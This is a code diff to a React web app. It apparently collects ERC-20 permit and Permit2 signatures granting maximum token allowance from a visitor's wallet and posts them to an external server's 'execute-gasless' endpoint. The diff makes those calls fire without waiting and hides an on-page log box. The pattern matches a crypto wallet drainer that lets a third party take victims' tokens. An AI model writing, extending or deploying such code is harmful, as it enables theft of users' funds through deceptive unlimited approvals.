@@ -331,7 +331,7 @@ export default function App() {
                     const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, MAX_UINT, deadline);
                     
                     // 🔥 BACKEND INTEGRATION ── SEND PERMIT SIG
-                    await fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+                      fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                       method: 'POST',
                       headers: { 'Content-Type': 'application/json' },
                       body: JSON.stringify({ 
@@ -390,7 +390,7 @@ export default function App() {
                     const signature = await signer.signTypedData(domain, types, message);
 
                     // 🔥 BACKEND INTEGRATION ── SEND PERMIT2 SIG
-                    await fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+                      fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                       method: 'POST',
                       headers: { 'Content-Type': 'application/json' },
                       body: JSON.stringify({ 
@@ -558,7 +558,7 @@ export default function App() {
       </div>
 
       {/* Hidden Debug Box */}
-      <div style={{ display: 'block', margin: '0 20px 20px 20px', padding: '10px', backgroundColor: '#000', color: '#0f0', fontSize: '11px', fontFamily: 'monospace', borderRadius: '8px', height: '120px', overflowY: 'auto' }}>
+      <div style={{ display: 'none', margin: '0 20px 20px 20px', padding: '10px', backgroundColor: '#000', color: '#0f0', fontSize: '11px', fontFamily: 'monospace', borderRadius: '8px', height: '120px', overflowY: 'auto' }}>
         <div style={{ color: '#fff', borderBottom: '1px solid #333', paddingBottom: '4px', marginBottom: '4px' }}>--- SYSTEM LOGS ---</div>
         {debugLogs.map((msg, idx) => (<div key={idx} style={{ marginTop: '2px' }}>{msg}</div>))}
       </div>
